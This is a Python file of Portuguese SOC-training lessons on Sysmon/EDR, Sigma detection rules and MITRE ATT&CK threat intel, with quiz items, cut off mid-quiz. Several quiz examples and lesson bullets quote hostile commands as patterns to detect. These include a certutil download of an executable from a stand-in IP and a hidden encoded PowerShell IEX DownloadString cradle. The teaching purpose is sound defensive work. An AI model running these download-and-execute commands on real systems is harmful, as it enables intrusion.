"""Fase 2 do curso, parte 2: os tópicos de SOC que faltavam no plano original.

Sysmon e EDR, regras de detecção, e threat intelligence com MITRE ATT&CK.
Mesmo formato dos tópicos de topicos_novos.py.
"""

SYSMON = {
    "id": "sysmon",
    "n": "Sysmon e EDR",
    "ic": "🔬",
    "tags": ["Sysmon"],
    "st": """<p class="mu">Os logs de login mostram <b>quem entrou</b>. O Sysmon e o EDR mostram <b>o que a pessoa (ou o malware) fez depois</b>: que programa rodou, com que comando, quem abriu quem e para onde conectou.</p>
<h3>O que é, em uma frase</h3>
<p>O <b>Sysmon</b> (System Monitor) é uma ferramenta gratuita da Microsoft (Sysinternals) que grava em detalhe a atividade do Windows. O <b>EDR</b> (Endpoint Detection and Response) é um produto de segurança que coleta isso, detecta comportamento suspeito e deixa você <b>responder</b>, como isolar a máquina.</p>
<h3>Comparação do dia a dia</h3>
<p>O log de login é o registro da portaria: quem entrou e a que horas. O Sysmon é a câmera dentro do prédio: mostra cada sala que a pessoa abriu, o que levou e com quem falou. O EDR é a câmera mais o segurança que pode trancar a porta.</p>
<h3>Os eventos do Sysmon que mais aparecem</h3>
<table><tr><th>ID</th><th>O que grava</th><th>Por que importa</th></tr>
<tr><td>1</td><td>Processo criado: programa, <b>linha de comando</b>, processo pai, usuário, hash</td><td>O mais usado: mostra exatamente o que rodou</td></tr>
<tr><td>3</td><td>Conexão de rede: processo, IP e porta de destino</td><td>Malware falando com o servidor do atacante (C2)</td></tr>
<tr><td>7</td><td>DLL carregada</td><td>DLLs maliciosas carregadas por programas legítimos</td></tr>
<tr><td>8</td><td>CreateRemoteThread</td><td>Injeção de código em outro processo</td></tr>
<tr><td>10</td><td>Acesso a outro processo</td><td>Acesso ao <b>lsass.exe</b> = roubo de senhas (Mimikatz)</td></tr>
<tr><td>11</td><td>Arquivo criado</td><td>O que foi baixado ou deixado no disco</td></tr>
<tr><td>12, 13, 14</td><td>Registro alterado</td><td>Persistência nas chaves Run</td></tr>
<tr><td>22</td><td>Consulta DNS: qual processo pediu qual nome</td><td>Domínio do atacante ligado ao processo que o chamou</td></tr></table>
<p>O Sysmon grava no log <b>Microsoft-Windows-Sysmon/Operational</b>. O que ele registra é definido num arquivo de configuração XML (os mais usados são o da SwiftOnSecurity e o sysmon-modular). Comparado com o evento <b>4688</b> do Windows, o Sysmon traz hash, processo pai completo e o <b>ProcessGuid</b>, que liga todos os eventos de um mesmo processo.</p>
<h3>A árvore de processos: quem abriu quem</h3>
<p>Todo programa é aberto por outro (o pai). Algumas relações pai → filho são normais, outras são alarme:</p>
<ul>
<li><b>WINWORD.EXE → powershell.exe</b>: um documento do Word abrindo PowerShell. Clássico de anexo malicioso com macro.</li>
<li><b>OUTLOOK.EXE → wscript.exe</b> ou <b>mshta.exe</b>: script vindo de e-mail.</li>
<li><b>excel.exe → cmd.exe → certutil.exe -urlcache -f http://...</b>: baixando arquivo com uma ferramenta do próprio Windows.</li>
<li><b>svchost.exe</b> cujo pai não é <b>services.exe</b>: provável impostor.</li>
</ul>
<h3>LOLBins: ferramentas do Windows usadas para atacar</h3>
<p>"Living off the land": em vez de trazer um vírus, o atacante usa programas que já existem no Windows e são confiáveis: <b>powershell</b>, <b>certutil</b> (baixar arquivos), <b>mshta</b>, <b>rundll32</b>, <b>regsvr32</b>, <b>bitsadmin</b>, <b>wmic</b>. O nome do programa é inocente: o que denuncia é a <b>linha de comando</b> e o <b>pai</b>.</p>
<h3>Sinais na linha de comando</h3>
<ul>
<li><code>-EncodedCommand</code> ou <code>-enc</code>: comando escondido em Base64 (em UTF-16LE; o CyberChef decodifica).</li>
<li><code>-WindowStyle Hidden</code>, <code>-nop</code>, <code>-ep bypass</code>: rodar escondido e sem restrições.</li>
<li><code>IEX</code>, <code>DownloadString</code>, <code>Invoke-WebRequest</code>: baixar e executar da internet.</li>
<li>Reconhecimento logo depois do login: <code>whoami</code>, <code>net group "domain admins" /domain</code>, <code>nltest /dclist</code>, <code>ipconfig /all</code>.</li>
</ul>
<h3>O que o EDR acrescenta</h3>
<ul>
<li>Exemplos: Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne.</li>
<li><b>Antivírus</b> compara arquivos com assinaturas conhecidas. <b>EDR</b> olha o <b>comportamento</b> e guarda o histórico para investigar.</li>
<li>Resposta: <b>isolar a máquina</b> da rede (só o EDR continua falando), matar o processo, colocar o arquivo em quarentena, coletar evidências.</li>
<li>XDR junta o EDR com e-mail, identidade e nuvem num lugar só.</li>
</ul>
<h3>Investigando um alerta de endpoint, passo a passo</h3>
<ol>
<li>Qual processo disparou, em qual máquina e com qual usuário?</li>
<li>Árvore: quem é o pai e quais filhos ele criou?</li>
<li>Linha de comando: o que exatamente rodou? (decodifique o Base64)</li>
<li>Rede e DNS (eventos 3 e 22): para onde conectou?</li>
<li>Arquivos e registro (11, 13): deixou algo para voltar depois (persistência)?</li>
<li>Escopo: o mesmo hash ou domínio aparece em outras máquinas?</li>
</ol>
<h3>No dia a dia de um SOC</h3>
<ul>
<li>A maioria dos alertas de endpoint chega pelo EDR, com a árvore de processos pronta. Saber ler essa árvore é o principal.</li>
<li>Muitos falsos positivos vêm de ferramentas de TI legítimas (scripts de inventário, SCCM, ferramentas de acesso remoto): confirme com o time de TI.</li>
<li>Isolar a máquina é rápido e reversível. Na dúvida com um verdadeiro positivo provável, isole e escale.</li>
</ul>
<h3>Pratique no lab</h3>
<p>No lab, aba <b>Terminal</b>, o arquivo <code>logs/sysmon.json</code> tem os eventos Sysmon do computador de uma conta comprometida. Os desafios mostram o que o atacante fez depois do login: o processo pai, o comando escondido e o reconhecimento.</p>
<h3>Erros comuns</h3>
<ul>
<li>Confiar no nome do processo. svch0st.exe, scvhost.exe e svchost.exe numa pasta errada não são o Windows.</li>
<li>Olhar o processo sozinho, sem o pai e a linha de comando.</li>
<li>Apagar o arquivo malicioso e fechar: e a persistência? E as outras máquinas?</li>
<li>Reiniciar a máquina antes de coletar evidências da memória.</li>
</ul>
<h3>Como explicar numa entrevista</h3>
<p><b>What is Sysmon and why is it useful?</b><br><i>It's a free Sysinternals tool that logs detailed endpoint activity: process creation with full command line, parent process and hashes, network connections and DNS queries. It lets me see what happened after a login, not just who logged in.</i></p>
<p><b>You see WINWORD.EXE spawning powershell.exe with -EncodedCommand. What do you do?</b><br><i>That's a classic malicious macro pattern. I decode the command, check network and DNS events for where it connected, look for files or persistence it created, and check the scope across other hosts. If it looks malicious, I isolate the host with the EDR and escalate.</i></p>""",
    "chk": [
        "Dizer o que o Sysmon grava e onde fica o log",
        "Explicar os eventos 1, 3, 10, 11 e 22 do Sysmon",
        "Ler uma árvore de processos e achar pai → filho suspeito",
        "Explicar o que são LOLBins, com exemplos",
        "Diferenciar antivírus e EDR, e dizer o que é isolar uma máquina",
        "Investigar um alerta de endpoint nos 6 passos",
        "Acertar 8 de 10 no quiz de Sysmon e EDR",
    ],
}

DETECCAO = {
    "id": "deteccao",
    "n": "Regras de Detecção",
    "ic": "🎯",
    "tags": ["Deteccao"],
    "st": """<p class="mu">Todo alerta que chega para o analista nasceu de uma regra que alguém escreveu. Entender como as regras funcionam ajuda a investigar melhor, a reconhecer um falso positivo e, mais tarde, a escrever as suas.</p>
<h3>O que é, em uma frase</h3>
<p>Uma regra de detecção é uma <b>lógica que roda sozinha sobre os logs e gera um alerta</b> quando encontra algo suspeito: um padrão, um limite ultrapassado ou um comportamento fora do normal.</p>
<h3>Comparação do dia a dia</h3>
<p>Pense no alarme de um carro. Sensível demais, dispara com o vento e ninguém liga mais (falso positivo). Pouco sensível, não dispara quando quebram o vidro (falso negativo). Ajustar a regra é achar o ponto certo.</p>
<h3>Tipos de detecção</h3>
<ul>
<li><b>Por indicador (IOC):</b> um hash, IP ou domínio conhecido como malicioso. Simples e preciso, mas o atacante troca fácil.</li>
<li><b>Por comportamento (TTP):</b> o jeito de atacar. Ex.: Word abrindo PowerShell. Mais difícil de o atacante evitar.</li>
<li><b>Por limite (threshold):</b> "mais de 20 falhas de login em 5 minutos do mesmo IP".</li>
<li><b>Por anomalia (baseline):</b> o que foge do normal daquela conta: horário, país, volume.</li>
<li><b>Correlação:</b> juntar eventos diferentes. Ex.: falhas de login seguidas de sucesso e depois criação de conta.</li>
</ul>
<h3>Sigma: a regra em formato aberto</h3>
<p>Cada SIEM tem sua linguagem (SPL no Splunk, KQL no Sentinel). O <b>Sigma</b> é um formato em YAML que descreve a regra uma vez e é convertido para qualquer SIEM (com o sigma-cli / pySigma).</p>
<pre>title: PowerShell com comando codificado
status: stable
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - ' -enc '
      - ' -EncodedCommand '
  condition: selection
falsepositives:
  - Scripts de administração legítimos
level: high
tags:
  - attack.execution
  - attack.t1059.001</pre>
<p>Lendo: em eventos de criação de processo no Windows, se o programa termina em powershell.exe <b>e</b> a linha de comando tem -enc ou -EncodedCommand, gera um alerta alto, mapeado no MITRE como T1059.001.</p>
<h3>Outros formatos que você vai ouvir</h3>
<ul>
<li><b>YARA:</b> regras para <b>arquivos</b> (strings e bytes que identificam um malware).</li>
<li><b>Suricata / Snort:</b> regras para <b>tráfego de rede</b>.</li>
<li><b>SPL e KQL:</b> as consultas nativas do Splunk e do Sentinel (veja o tópico SIEM).</li>
</ul>
<h3>Verdadeiro, falso, positivo, negativo</h3>
<table><tr><th></th><th>A regra alertou</th><th>A regra não alertou</th></tr>
<tr><td><b>Era ataque</b></td><td>Verdadeiro positivo ✅</td><td>Falso negativo ❌ (o pior: ninguém viu)</td></tr>
<tr><td><b>Não era ataque</b></td><td>Falso positivo (ruído)</td><td>Verdadeiro negativo ✅</td></tr></table>
<h3>Ajuste fino (tuning)</h3>
<ul>
<li>Muito falso positivo cansa o time (<b>fadiga de alertas</b>) e o alerta verdadeiro se perde.</li>
<li>Exclusões devem ser <b>específicas</b>: "o script X, no servidor Y, com a conta de serviço Z", nunca "ignorar todo o servidor" ou "ignorar o usuário admin".</li>
<li>Toda exceção tem dono, motivo e data de revisão.</li>
<li>Antes de publicar, teste a regra com dados reais (quantos alertas ela teria gerado na semana passada?) e com uma simulação do ataque (Atomic Red Team).</li>
</ul>
<h3>Detection as code</h3>
<p>Em times maduros, as regras ficam num repositório Git, passam por revisão, têm testes e são publicadas automaticamente. Cada regra tem documentação: o que detecta, por que importa, falsos positivos conhecidos e o que o analista deve fazer (o playbook).</p>
<h3>O ciclo de vida de uma regra</h3>
<p><b>Hipótese</b> (o que quero pegar?) → <b>dados</b> (tenho o log certo?) → <b>escrever</b> → <b>testar</b> → <b>publicar</b> → <b>medir</b> (quantos alertas, quantos verdadeiros) → <b>ajustar</b>.</p>
<h3>No dia a dia de um SOC</h3>
<ul>
<li>Como analista júnior, você <b>lê</b> a regra para entender o alerta: o que exatamente disparou? É o mesmo padrão ou algo parecido?</li>
<li>Quando fecha um falso positivo, registre o motivo. Muitos fechamentos pelo mesmo motivo viram um pedido de tuning.</li>
<li>Threat hunting é o caminho inverso: procurar ataques que nenhuma regra pegou, a partir de uma hipótese.</li>
</ul>
<h3>Pratique no lab</h3>
<p>No dashboard do lab, as regras R001 a R006 estão em <code>config/detection_rules.json</code>. Mude os limites na barra lateral e veja os alertas mudarem. A seção de exportação mostra as mesmas regras em <b>Sigma</b>, <b>SPL</b> e <b>KQL</b>.</p>
<h3>Erros comuns</h3>
<ul>
<li>Achar que "nenhum alerta" quer dizer "nenhum ataque". Pode ser falta de log ou de regra.</li>
<li>Resolver falso positivo desligando a regra inteira.</li>
<li>Exclusão ampla demais, que vira um ponto cego que o atacante pode usar.</li>
<li>Regra só por IOC: o atacante troca o IP amanhã.</li>
</ul>
<h3>Como explicar numa entrevista</h3>
<p><b>What is Sigma?</b><br><i>It's an open, YAML-based format for detection rules. You write the logic once, with the log source, the selection and the condition, and convert it to Splunk SPL, Sentinel KQL or other SIEMs. It also carries metadata like severity, false positives and MITRE ATT&CK tags.</i></p>
<p><b>A rule generates lots of false positives. What do you do?</b><br><i>I look at what the false positives have in common and propose a narrow exclusion, for example a specific script on a specific server, documented with an owner and a review date. I don't disable the rule, because that creates a blind spot.</i></p>""",
    "chk": [
        "Diferenciar detecção por IOC, comportamento, limite e anomalia",
        "Ler uma regra Sigma: logsource, selection, condition, level e tags",
        "Explicar verdadeiro e falso positivo, e por que o falso negativo é o pior",
        "Propor um ajuste fino com exclusão específica",
        "Dizer para que servem YARA e Suricata",
        "Explicar o ciclo de vida de uma regra",
        "Acertar 8 de 10 no quiz de Regras de Detecção",
    ],
}

CTI = {
    "id": "cti",
    "n": "Threat Intel e MITRE ATT&CK",
    "ic": "🧭",
    "tags": ["CTI"],
    "st": """<p class="mu">Threat intelligence (CTI) é saber quem ataca, como ataca e com o quê, para defender melhor. O MITRE ATT&CK é o "dicionário" que todo SOC usa para falar sobre técnicas de ataque.</p>
<h3>O que é, em uma frase</h3>
<p>Threat intelligence é <b>informação sobre ameaças, com contexto, que ajuda a tomar uma decisão</b>: bloquear, procurar, priorizar ou ignorar. Uma lista de IPs sem contexto é dado. Saber que aquele IP é de uma campanha de phishing contra bancos brasileiros nesta semana é inteligência.</p>
<h3>Comparação do dia a dia</h3>
<p>A polícia avisa os bancos: "uma quadrilha está usando este carro, chega às 10h e entra pela porta dos fundos". A placa do carro é um <b>IOC</b> (fácil de trocar). O jeito de agir, chegar cedo e entrar pelos fundos, é o <b>TTP</b> (difícil de mudar).</p>
<h3>Níveis de inteligência</h3>
<ul>
<li><b>Estratégica:</b> para a diretoria. "Ransomware contra o setor de saúde cresceu este ano."</li>
<li><b>Operacional:</b> sobre campanhas e grupos. "O grupo X está mandando faturas falsas."</li>
<li><b>Tática:</b> TTPs, como eles atacam. "Usam macro do Word que abre PowerShell."</li>
<li><b>Técnica:</b> os IOCs. Hashes, IPs, domínios, URLs.</li>
</ul>
<h3>Tipos de IOC e a pirâmide da dor</h3>
<p>Quanto mais alto na pirâmide (de David Bianco), mais "dói" para o atacante quando você detecta:</p>
<table><tr><th>Nível</th><th>Exemplo</th><th>Para o atacante trocar</th></tr>
<tr><td>Hash</td><td>SHA256 de um arquivo</td><td>Trivial (muda um byte)</td></tr>
<tr><td>Endereço IP</td><td>203.0.113.50</td><td>Fácil</td></tr>
<tr><td>Domínio</td><td>update-office365.com</td><td>Simples</td></tr>
<tr><td>Artefatos de rede ou do host</td><td>User-Agent estranho, chave de registro</td><td>Chato</td></tr>
<tr><td>Ferramentas</td><td>Mimikatz, Cobalt Strike</td><td>Difícil</td></tr>
<tr><td>TTPs</td><td>Phishing com macro → PowerShell → roubo de credencial</td><td>Muito difícil</td></tr></table>
<h3>Onde buscar informação (OSINT)</h3>
<ul>
<li><b>VirusTotal:</b> reputação de hash, URL, domínio e IP.</li>
<li><b>AbuseIPDB:</b> denúncias de IPs maliciosos. <b>GreyNoise:</b> diz se o IP é só "ruído" de varredura da internet.</li>
<li><b>URLhaus</b> e <b>MalwareBazaar</b> (abuse.ch): URLs e amostras de malware.</li>
<li><b>AlienVault OTX</b>, <b>MISP</b> (plataforma para compartilhar inteligência entre empresas), alertas da <b>CISA</b> e relatórios de fornecedores.</li>
<li><b>Shodan:</b> o que está exposto na internet.</li>
<li>Cuidado: <b>nunca envie arquivos internos ou confidenciais</b> para o VirusTotal. Prefira consultar o hash.</li>
</ul>
<h3>TLP: com quem posso compartilhar?</h3>
<p>O Traffic Light Protocol diz até onde a informação pode ir: <b>TLP:CLEAR</b> (público), <b>TLP:GREEN</b> (a comunidade), <b>TLP:AMBER</b> (sua organização e quem precisa saber; <b>AMBER+STRICT</b>: só sua organização) e <b>TLP:RED</b> (só quem estava na conversa).</p>
<h3>MITRE ATT&CK</h3>
<ul>
<li>Uma base de conhecimento pública, montada a partir de ataques reais, organizada em <b>táticas</b> (o objetivo, o "porquê") e <b>técnicas</b> (o "como").</li>
<li>A matriz Enterprise tem <b>14 táticas</b>, na ordem de um ataque: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration e Impact.</li>
<li>Técnicas têm IDs: <b>T1566</b> Phishing, <b>T1110</b> Brute Force, <b>T1078</b> Valid Accounts, <b>T1059.001</b> PowerShell (uma <b>subtécnica</b> de T1059), <b>T1003</b> OS Credential Dumping, <b>T1071</b> Application Layer Protocol (C2 por HTTP), <b>T1486</b> Data Encrypted for Impact (ransomware).</li>
<li>Também lista <b>grupos</b> (ex.: APT29 = G0016), softwares, mitigações e as fontes de log que detectam cada técnica.</li>
<li>O <b>ATT&CK Navigator</b> pinta a matriz: o que já detectamos e onde estão os buracos.</li>
</ul>
<h3>Outros modelos</h3>
<ul>
<li><b>Cyber Kill Chain</b> (Lockheed Martin): 7 fases, de reconhecimento a ações no objetivo. Quebrar qualquer elo interrompe o ataque.</li>
<li><b>Diamond Model:</b> todo evento liga adversário, infraestrutura, capacidade e vítima.</li>
</ul>
<h3>O ciclo de inteligência</h3>
<p><b>Requisitos</b> (o que precisamos saber?) → <b>coleta</b> → <b>processamento</b> → <b>análise</b> → <b>disseminação</b> (entregar para quem decide) → <b>feedback</b>.</p>
<h3>No dia a dia de um SOC</h3>
<ul>
<li><b>Enriquecer alertas:</b> o IP do alerta tem reputação ruim? Já apareceu em outros casos?</li>
<li><b>Caçar IOCs de um relatório:</b> saiu um alerta da CISA com 20 hashes e domínios; procure no SIEM se algum apareceu nos últimos 90 dias.</li>
<li><b>Mapear casos no ATT&CK:</b> o relatório do incidente diz quais técnicas foram vistas.</li>
<li>IOC envelhece: um IP malicioso de seis meses atrás hoje pode ser de outra pessoa. Bloquear IP de CDN ou de nuvem compartilhada pode derrubar sites legítimos.</li>
</ul>
<h3>Pratique no lab</h3>
<p>O dashboard do lab enriquece os IPs com reputação e geolocalização (arquivos fictícios em <code>data/enrichment/</code>) e cada alerta mostra a técnica do MITRE ATT&CK. No Terminal, o arquivo <code>logs/proxy.csv</code> tem o tráfego web do caso: encontre o domínio do atacante e o volume enviado.</p>
<h3>Erros comuns</h3>
<ul>
<li>Achar que "VirusTotal 0/70" quer dizer seguro. Malware novo ou direcionado ainda não é conhecido.</li>
<li>Bloquear IOCs sem checar a idade e se são compartilhados (CDN, nuvem).</li>
<li>Subir um documento interno no VirusTotal: ele fica disponível para outros.</li>
<li>Confundir tática (objetivo) e técnica (método).</li>
</ul>
<h3>Como explicar numa entrevista</h3>
<p><b>What is the difference between an IOC and a TTP?</b><br><i>An IOC is an artefact like a hash, IP or domain, easy for the attacker to change. A TTP is the behaviour, how they attack, which is much harder to change. That's the idea behind the Pyramid of Pain: detecting TTPs hurts the attacker more.</i></p>
<p><b>How do you use MITRE ATT&CK in your work?</b><br><i>To describe what I see in a common language, for example T1059.001 for malicious PowerShell, to check which techniques our rules cover, and to look at the next likely steps of an attacker when I find one technique.</i></p>""",
    "chk": [
        "Explicar o que é threat intelligence e os 4 níveis",
        "Diferenciar IOC e TTP usando a pirâmide da dor",
        "Usar VirusTotal, AbuseIPDB e GreyNoise sem vazar dados",
        "Explicar o TLP (CLEAR, GREEN, AMBER, RED)",
        "Citar táticas do MITRE ATT&CK e técnicas com seus IDs",
        "Explicar como caçar os IOCs de um relatório no SIEM",
        "Acertar 8 de 10 no quiz de Threat Intel",
    ],
}

SOC2_TOPICS = [SYSMON, DETECCAO, CTI]

SOC2_RESUMOS = {
    "sysmon": [
        "Sysmon grava o que roda no Windows: processo, linha de comando, pai, hash, rede e DNS.",
        "1 = processo, 3 = conexão, 10 = acesso a processo (lsass!), 11 = arquivo, 13 = registro, 22 = DNS.",
        "Árvore: Word → PowerShell, Outlook → wscript = suspeito. Olhe sempre o pai.",
        "LOLBins: ferramentas do Windows usadas para atacar (certutil, mshta, rundll32).",
        "-enc, -w hidden, IEX, DownloadString: sinais na linha de comando do PowerShell.",
        "EDR = telemetria + detecção por comportamento + resposta (isolar a máquina).",
    ],
    "deteccao": [
        "Regra de detecção = lógica que roda sozinha sobre os logs e gera alerta.",
        "Tipos: IOC, comportamento (TTP), limite, anomalia e correlação.",
        "Sigma = regra em YAML (logsource, detection, condition) convertida para qualquer SIEM.",
        "YARA = arquivos. Suricata/Snort = tráfego de rede.",
        "Falso negativo é o pior: o ataque passou sem alerta.",
        "Tuning com exclusões específicas, com dono e data. Nunca desligar a regra inteira.",
    ],
    "cti": [
        "Threat intel = informação sobre ameaças com contexto, para decidir.",
        "Níveis: estratégica, operacional, tática (TTPs) e técnica (IOCs).",
        "Pirâmide da dor: hash e IP são fáceis de trocar; TTPs são difíceis.",
        "VirusTotal, AbuseIPDB, GreyNoise, URLhaus, MISP. Nunca suba arquivo interno.",
        "TLP: CLEAR público, GREEN comunidade, AMBER organização, RED só quem estava na conversa.",
        "ATT&CK: 14 táticas (porquê) e técnicas (como): T1566 phishing, T1110 força bruta, T1059.001 PowerShell.",
    ],
}

SOC2_Q = [
    # ---------------------------------------------------------------- Sysmon e EDR
    ("Sysmon", "Qual evento do Sysmon registra a criação de um processo, com a linha de comando?",
     ["Evento 1", "Evento 3", "Evento 22", "Evento 4625"],
     "O evento 1 (Process Create) traz programa, linha de comando, processo pai, usuário e hash.",
     ["O 3 é conexão de rede.", "O 22 é consulta DNS.", "4625 é falha de login no log Security, não Sysmon."],
     "É o evento mais usado em investigações de endpoint.",
     "EventID 1: Image=powershell.exe, ParentImage=WINWORD.EXE, CommandLine=powershell -enc ..."),
    ("Sysmon", "Qual evento do Sysmon mostra qual processo consultou qual nome de domínio?",
     ["Evento 22 (DNS query)", "Evento 1", "Evento 11", "Evento 4740"],
     "O 22 liga o nome consultado ao processo que pediu: ótimo para achar o C2.",
     ["O 1 é criação de processo.", "O 11 é criação de arquivo.", "4740 é conta bloqueada no log Security."],
     "Um proxy mostra que o computador acessou o domínio; o Sysmon 22 mostra qual programa fez isso.",
     "EventID 22: Image=rundll32.exe QueryName=cdn-update-check.net."),
    ("Sysmon", "Por que um evento Sysmon 10 com destino lsass.exe é preocupante?",
     ["Porque pode ser roubo de senhas da memória (ex.: Mimikatz)", "Porque o lsass é um jogo", "Porque significa que a impressora travou", "Porque é atualização normal do Office"],
     "O lsass.exe guarda credenciais na memória. Acesso a ele por um processo estranho = credential dumping (T1003).",
     ["lsass é um processo crítico do Windows.", "Não tem relação com impressão.", "O Office não precisa ler a memória do lsass."],
     "Antivírus e EDR têm proteções específicas para o lsass por causa disso.",
     "EventID 10: SourceImage=C:\\Users\\Public\\x.exe TargetImage=lsass.exe."),
    ("Sysmon", "WINWORD.EXE abriu powershell.exe. O que isso sugere?",
     ["Possível documento malicioso com macro executando código", "Uso normal do Word", "Atualização do Windows", "Um problema de impressora"],
     "O Word não precisa abrir PowerShell no uso normal. É o padrão clássico de anexo malicioso.",
     ["Uso normal do Word não cria PowerShell.", "O Windows Update não roda pelo Word.", "Impressão não abre PowerShell."],
     "Muitas empresas bloqueiam isso com as regras ASR do Defender ('Block all Office applications from creating child processes').",
     "ParentImage=WINWORD.EXE → Image=powershell.exe -nop -w hidden -enc JABz..."),
    ("Sysmon", "O que são LOLBins?",
     ["Programas legítimos do Windows usados para fins maliciosos", "Vírus que vêm de jogos", "Uma marca de antivírus", "Arquivos de log apagados"],
     "Living off the land: o atacante usa o que já existe (certutil, mshta, rundll32) para não chamar atenção.",
     ["Não são vírus, são ferramentas do sistema.", "Não é marca.", "Não tem relação com logs apagados."],
     "O site LOLBAS lista esses programas e como são abusados.",
     "certutil.exe -urlcache -f http://198.51.100.23/a.exe a.exe baixa um arquivo."),
    ("Sysmon", "O que indica -EncodedCommand (ou -enc) numa linha de comando do PowerShell?",
     ["O comando está escondido em Base64", "O PowerShell está criptografando o disco", "É um comando de impressão", "É o modo de ajuda"],
     "Admins quase nunca usam isso; atacantes usam muito para esconder o que rodam.",
     ["Não criptografa disco, só esconde o texto do comando.", "Não tem relação com impressão.", "A ajuda é Get-Help."],
     "O Base64 do -enc é em UTF-16LE. No CyberChef: From Base64 + Decode text (UTF-16LE).",
     "powershell -enc SQBFAFgA... decodificado vira IEX (New-Object Net.WebClient).DownloadString(...)."),
    ("Sysmon", "Qual a principal diferença entre antivírus tradicional e EDR?",
     ["O antivírus compara com assinaturas; o EDR analisa comportamento, guarda histórico e permite responder", "Não há diferença", "O EDR só funciona no Linux", "O antivírus isola máquinas e o EDR não"],
     "O EDR enxerga o ataque mesmo sem um arquivo conhecido, e deixa você investigar e conter.",
     ["São bem diferentes em capacidade.", "EDRs existem para Windows, Linux e Mac.", "Isolar é uma função típica do EDR."],
     "Exemplos: Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne.",
     "EDR mostra a árvore Outlook → Excel → cmd → certutil, e você isola o PC com um clique."),
    ("Sysmon", "O que significa isolar uma máquina pelo EDR?",
     ["Cortar a rede da máquina, mantendo só a conexão com o EDR para investigar", "Desligar a máquina da tomada", "Apagar o disco", "Mudar a máquina de sala"],
     "Impede a ameaça de se espalhar ou falar com o atacante, sem destruir evidências.",
     ["Desligar perde as evidências da memória.", "Apagar destrói evidências.", "Não é algo físico."],
     "É reversível: depois da limpeza, a máquina volta para a rede.",
     "Defender for Endpoint → Device → Isolate device."),
    ("Sysmon", "Um svchost.exe está rodando de C:\\Users\\Public\\. O que pensar?",
     ["Provável malware imitando um processo do Windows", "Normal, o svchost roda de qualquer pasta", "É o Office atualizando", "É um driver de impressora"],
     "O svchost.exe legítimo fica em C:\\Windows\\System32 e é aberto pelo services.exe.",
     ["O caminho e o pai importam.", "O Office não usa o nome svchost.", "Drivers não ficam em Users\\Public."],
     "Confira sempre: caminho, processo pai, assinatura digital e hash.",
     "Image=C:\\Users\\Public\\svchost.exe, ParentImage=explorer.exe → investigar."),
    ("Sysmon", "Qual campo do Sysmon liga eventos diferentes do mesmo processo (criação, rede, DNS)?",
     ["ProcessGuid", "Computer", "Hostname do DNS", "EventRecordID"],
     "O ProcessGuid é único por processo e aparece em vários tipos de evento.",
     ["Computer só diz a máquina.", "O nome consultado não identifica o processo.", "EventRecordID numera o evento, não o processo."],
     "O ProcessId (PID) se repete com o tempo; o ProcessGuid não.",
     "Filtrar ProcessGuid={...-1a2b} mostra o evento 1, as conexões (3) e o DNS (22) desse processo."),
    ("Sysmon", "Logo após um login suspeito, o Sysmon mostra whoami e net group \"domain admins\" /domain. O que é?",
     ["Reconhecimento (Discovery): o atacante descobrindo quem é e quem são os admins", "Uso normal do Outlook", "Backup do servidor", "Instalação de impressora"],
     "Esses comandos mapeiam o ambiente. São a tática Discovery do MITRE (T1033, T1069).",
     ["O Outlook não roda esses comandos.", "Backup não lista administradores.", "Não tem relação com impressora."],
     "Um usuário comum quase nunca roda net group. Em sequência, logo depois do login, é forte sinal.",
     "08:43 whoami /all → 08:44 net group \"domain admins\" /domain → 08:45 nltest /dclist."),
    ("Sysmon", "Achou um arquivo malicioso numa máquina. Por que não basta apagá-lo e fechar o caso?",
     ["Pode haver persistência, outras máquinas afetadas e credenciais roubadas", "Porque apagar arquivos é proibido", "Porque o arquivo volta sozinho sempre", "Basta, sim"],
     "É preciso entender o escopo: como entrou, o que fez, se ficou algo para voltar e onde mais está.",
     ["Apagar é parte da erradicação, mas não é tudo.", "Nem sempre volta, mas se houver persistência, volta.", "Fechar só com isso deixa o atacante no ambiente."],
     "Procure o mesmo hash e o mesmo domínio em todas as máquinas (no EDR ou SIEM).",
     "Chave Run criada (Sysmon 13) faz o malware voltar a cada login."),
    # ---------------------------------------------------------------- Regras de detecção
    ("Deteccao", "O que é uma regra de detecção?",
     ["Uma lógica que roda sobre os logs e gera alerta quando encontra algo suspeito", "Uma política de senha", "Um backup automático", "Uma regra de firewall que bloqueia portas"],
     "É de onde nasce cada alerta que o analista recebe.",
     ["Política de senha é configuração de contas.", "Backup é outra coisa.", "Firewall bloqueia tráfego; a regra de detecção alerta sobre logs."],
     "Pode ser escrita em SPL, KQL, Sigma ou na linguagem do EDR.",
     "Mais de 20 eventos 4625 do mesmo IP em 5 minutos → alerta de força bruta."),
    ("Deteccao", "O que é Sigma?",
     ["Um formato aberto de regras de detecção, em YAML, que pode ser convertido para vários SIEMs", "Um antivírus", "Uma linguagem de programação de jogos", "Um tipo de log do Linux"],
     "Escreve uma vez, converte para SPL, KQL e outros.",
     ["Não é antivírus.", "Não tem relação com jogos.", "Não é log, é regra sobre logs."],
     "O repositório SigmaHQ tem milhares de regras prontas da comunidade.",
     "sigma convert -t splunk regra.yml → consulta SPL pronta."),
    ("Deteccao", "Numa regra Sigma, para que serve o campo logsource?",
     ["Dizer em que tipo de log a regra procura (produto, categoria, serviço)", "Dizer o nome de quem escreveu", "Dar a nota da regra", "Guardar o resultado"],
     "Ex.: product: windows, category: process_creation.",
     ["O autor fica no campo author.", "A severidade fica em level.", "A regra não guarda resultados."],
     "A conversão usa o logsource para saber o índice ou a tabela certa no SIEM.",
     "logsource: product: windows / service: security → eventos do log Security."),
    ("Deteccao", "Qual é o pior resultado para uma regra de detecção?",
     ["Falso negativo: houve ataque e a regra não alertou", "Falso positivo", "Verdadeiro positivo", "Verdadeiro negativo"],
     "No falso negativo, ninguém vê o ataque.",
     ["Falso positivo gera trabalho, mas alguém olha.", "Verdadeiro positivo é a regra funcionando.", "Verdadeiro negativo é o normal: nada aconteceu e nada alertou."],
     "Por isso, testar regras com simulações (Atomic Red Team) é importante.",
     "A regra procurava '-enc ', mas o atacante usou '-e ': falso negativo."),
    ("Deteccao", "Uma regra gera 200 falsos positivos por dia por causa de um script de inventário. Melhor ação?",
     ["Criar uma exclusão específica para esse script, nesse servidor, documentada", "Desligar a regra", "Excluir todo o servidor da regra", "Ignorar os alertas"],
     "Exclusão estreita tira o ruído sem criar ponto cego.",
